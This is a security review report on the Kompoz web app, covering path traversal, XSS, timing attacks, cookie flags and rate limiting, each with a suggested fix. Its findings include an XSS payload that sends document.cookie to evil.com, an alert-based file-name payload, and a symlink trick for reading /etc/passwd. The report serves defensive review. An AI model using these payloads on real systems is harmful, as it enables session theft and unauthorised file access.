# Kompoz Security & Architecture Analysis

> Generated for ferment `019ed893-393d-701e-9304-e1bfbe7514c7` — Project analysis and code review.

## Methodology

- Full codebase read (all `server/`, `public/js/`, `public/*.html`, `test/`, config files)
- Backend focused on auth, path traversal, input validation, error handling
- Frontend focused on XSS vectors, unsafe DOM insertion, CSRF surface, event handling
- Test & lint focused on coverage gaps and rule configuration

---

## Findings Summary

| Severity | Count |
|---|---|
| **Critical** | 2 |
| **High** | 4 |
| **Medium** | 5 |
| **Low** | 2 |

---

## Critical

### C1 — Symlink-based path traversal in safeResolvePath
- **File**: `server/utils/fs.js:155-158`
- **Details**: `safeResolvePath` uses `path.resolve` which resolves paths *logically* but does **not** follow symlinks. If an attacker creates a symlink inside a project pointing outside the mount root (e.g., `ln -s /etc/passwd compose/exploit.yml`), the prefix check `resolved.startsWith(baseResolved + path.sep)` passes because `resolved` is still under the base. The subsequent `fs.readFileSync` follows the symlink and returns arbitrary filesystem contents.
- **Suggested Fix**: Resolve real paths before comparison:
  ```js
  function safeResolvePath(base, filePath) {
    const baseResolved = fs.realpathSync(path.resolve(base));
    const resolved = fs.realpathSync(path.resolve(baseResolved, filePath));
    if (resolved !== baseResolved && !resolved.startsWith(baseResolved + path.sep)) {
      throw new Error('Path traversal detected');
    }
    return resolved;
  }
  ```
  Also handle `ENOENT` gracefully for non-existent intermediate paths.

### C2 — XSS via innerHTML in Container Map tooltip
- **File**: `public/map.html` (functions `showTip`, `showPortTip`)
- **Details**: Tooltip HTML is built via string concatenation and assigned to `tt.innerHTML`:
  ```js
  let html = `<div class="tt-title">${d.name}</div>`;
  if (d.image) html += `<div class="tt-row">${I18N.t('imageLabel')} <b>${d.image}</b></div>`;
  ```
  `d.name`, `d.image`, `d.ports`, `d.networks`, `d.sourceFile` are parsed from user-authored YAML files. A malicious service name like `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` will execute when the map tooltip is rendered.
- **Suggested Fix**: Build the tooltip with DOM APIs and `textContent`:
  ```js
  const tt = document.getElementById('tooltip');
  tt.innerHTML = '';
  const title = document.createElement('div'); title.className = 'tt-title'; title.textContent = d.name;
  tt.appendChild(title);
  if (d.image) {
    const row = document.createElement('div'); row.className = 'tt-row';
    row.textContent = I18N.t('imageLabel') + ' ' + d.image;
    tt.appendChild(row);
  }
  // etc.
  ```

---

## High

### H1 — Timing attack in login endpoint
- **File**: `server/index.js:53-55`
- **Details**: `if (username !== AUTH_USER || password !== AUTH_PASS)` uses standard JavaScript string comparison, which short-circuits and leaks timing information via side channels.
- **Suggested Fix**: Use `crypto.timingSafeEqual` with padded buffers:
  ```js
  function safeCompare(a, b) {
    if (typeof a !== 'string' || typeof b !== 'string') return false;
    const bufA = Buffer.from(a.padEnd(256, '\0'));
    const bufB = Buffer.from(b.padEnd(256, '\0'));
    return crypto.timingSafeEqual(bufA, bufB);
  }
  if (!safeCompare(username, AUTH_USER) || !safeCompare(password, AUTH_PASS)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  ```

### H2 — Timing attack in token verification
- **File**: `server/index.js:30-32`
- **Details**: `sig !== expected` is a standard string comparison vulnerable to timing attacks. An attacker with many token samples could brute-force the HMAC signature byte-by-byte.
- **Suggested Fix**: Convert both to `Buffer` and use `crypto.timingSafeEqual`:
  ```js
  const sigBuf = Buffer.from(sig, 'base64url');
  const expBuf = Buffer.from(expected, 'base64url');
  if (sigBuf.length !== expBuf.length) return null;
  if (!crypto.timingSafeEqual(sigBuf, expBuf)) return null;
  ```

### H3 — Auth cookie lacks Secure flag
- **File**: `server/index.js:61`
- **Details**: The `Set-Cookie` header includes `HttpOnly` and `SameSite=Strict` but omits `Secure`. In a production HTTPS deployment the cookie could be transmitted over an unencrypted connection.
- **Suggested Fix**: Append `; Secure` when behind HTTPS, or use a `__Host-` prefix:
  ```js
  const secure = req.secure ? '; Secure' : '';
  res.setHeader('Set-Cookie', COOKIE_NAME + '=' + token + '; HttpOnly; Path=/; SameSite=Strict' + secure + '; Max-Age=' + (TOKEN_TTL_MS / 1000));
  ```

### H4 — XSS in Sidebar file list via incomplete _esc escaping
- **File**: `public/js/sidebar.js:37-52` (function `_item`)
- **Details**: `_esc(f.path)` only escapes backslashes and single quotes (`s.replace(/\\/g,'\\\\').replace(/'/g,"\\'")`). It does **not** escape HTML metacharacters (`<`, `>`, `"`). If a project contains a file named `test<img src=x onerror=alert(1)>.yml`, the rendered sidebar will execute the payload because `f.name` is also interpolated unescaped into the template.
- **Suggested Fix**: Add an HTML entity escaper and use it for all attributes and text inserted into innerHTML:
  ```js
  function _escHtml(s) {
    const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
    return s.replace(/[&<>"']/g, c => map[c]);
  }
  // Use _escHtml for f.name, f.path, and all other dynamic values in _item
  ```
  Long-term: migrate sidebar rendering to DOM-based construction instead of `innerHTML` strings.

---

## Medium

### M1 — Error messages leak filesystem paths
- **File**: `server/routes/files.js` (multiple catch blocks, e.g., lines 32, 50, 68, 82, 96, 110, 145), `server/routes/projects.js` (catch blocks, e.g., lines 18, 28, 56)
- **Details**: `res.status(500).json({ error: err.message })` sends raw error strings to the client. For filesystem errors this often includes absolute paths (e.g., `ENOENT: no such file or directory, open '/mnt/data/secret/foo.yml'`), disclosing internal directory structure.
- **Suggested Fix**: Log the full error server-side (e.g., `console.error(err)`), return a generic key to the client:
  ```js
  catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error', errorKey: 'errorLoadFiles' });
  }
  ```

### M2 — No rate limiting on login endpoint
- **File**: `server/index.js:50-62`
- **Details**: The `/api/login` endpoint has no rate limiting. An attacker can brute-force credentials without restriction.
- **Suggested Fix**: Add a simple in-memory rate limiter or use `express-rate-limit`. Example:
  ```js
  const loginAttempts = new Map();
  app.post('/api/login', (req, res) => {
    const ip = req.ip;
    const now = Date.now();
    const attempts = loginAttempts.get(ip) || [];
    const recent = attempts.filter(t => now - t < 15 * 60 * 1000);
    if (recent.length > 5) return res.status(429).json({ error: 'Too many attempts' });
    // ... validate credentials ...
    if (invalid) { recent.push(now); loginAttempts.set(ip, recent); }
  });
  ```

### M3 — Toast notifications use innerHTML with API error messages
- **File**: `public/js/toast.js:6`
- **Details**: `el.innerHTML = \`<span>...</span><span>${msg}</span>\`` — `msg` is passed directly to `innerHTML`. If `msg` comes from an API error response (`data.error`), a compromised or malicious server response could inject arbitrary HTML.
- **Suggested Fix**: Replace `innerHTML` with DOM construction:
  ```js
  const iconSpan = document.createElement('span'); iconSpan.textContent = icons[type] || '·';
  const msgSpan = document.createElement('span'); msgSpan.textContent = msg;
  el.appendChild(iconSpan); el.appendChild(msgSpan);
  ```

### M4 — Circular dependency risk in client modules
- **File**: `public/js/app.js`, `public/js/sidebar.js`, `public/js/modals.js`
- **Details**: The vanilla JS module pattern relies on implicit global ordering. `App` references `Modals`, `Sidebar`, `State`, etc. While currently there is no explicit circular dependency, the architecture makes it easy to introduce one (e.g., `Sidebar` calling `App.loadFiles()` while `App` initializes `Sidebar`). The `<script>` loading order in `editor.html` is the only thing preventing breakage.
- **Suggested Fix**: Add a lightweight dependency graph or use ES modules (`<script type="module">`) with explicit imports/exports. At minimum, document the load order requirements in `public/index.html` comments.

### M5 — Inline event handlers prevent CSP adoption
- **File**: `public/editor.html` and `public/map.html` (throughout)
- **Details**: Dozens of `onclick="App.toggleProjectDropdown()"`, `onmouseenter="showLegend()"`, etc. These make it impossible to deploy a strict `Content-Security-Policy` without `unsafe-inline`.
- **Suggested Fix**: Migrate all inline handlers to `addEventListener` in the corresponding JS modules:
  ```js
  // In app.js init
  document.getElementById('projectSelector').addEventListener('click', App.toggleProjectDropdown);
  ```

---

## Low

### L1 — No extension whitelist on file create/save
- **File**: `server/routes/files.js:74-98`
- **Details**: Users can create arbitrary file types (`.sh`, `.exe`, `.php`, etc.) inside project directories. While path traversal is blocked (except via symlinks), this allows executable content upload.
- **Suggested Fix**: Whitelist allowed extensions:
  ```js
  const ALLOWED_EXT = /\.(yml|yaml|env|conf|json|txt|md|ini|properties|bak)$/i;
  if (!ALLOWED_EXT.test(filePath)) return res.status(400).json({ error: 'Invalid file type' });
  ```

### L2 — parseCookies lacks try-catch around decodeURIComponent
- **File**: `server/index.js:42-49`
- **Details**: `decodeURIComponent(v.join('='))` throws on malformed percent-encoding, causing an unhandled exception and a hung/crashed request.
- **Suggested Fix**: Wrap in try-catch and skip malformed cookies:
  ```js
  let value = '';
  try { value = decodeURIComponent(v.join('=')); } catch { value = v.join('='); }
  cookies[k] = value;
  ```

---

## Architectural Observations

1. **No bundler / build step**: The frontend is raw JS loaded via `<script>` tags. This keeps the stack simple but makes tree-shaking, minification, and CSP difficult.
2. **Server-side and client-side lint duplication**: `dclint` is used both in the Express route (`/api/files/lint`) and in the browser via CodeMirror addon. Keeping rule configs in sync is manual and error-prone.
3. **Auth is optional but global**: `AUTH_ENABLED` is a runtime flag. When disabled, the `requireAuth` middleware is a no-op. This is fine for local use but makes it easy to accidentally deploy without auth.
4. **project-overview.md** covers the full codebase map, stack, and module integration points — see `.kimchi/docs/project-overview.md`.
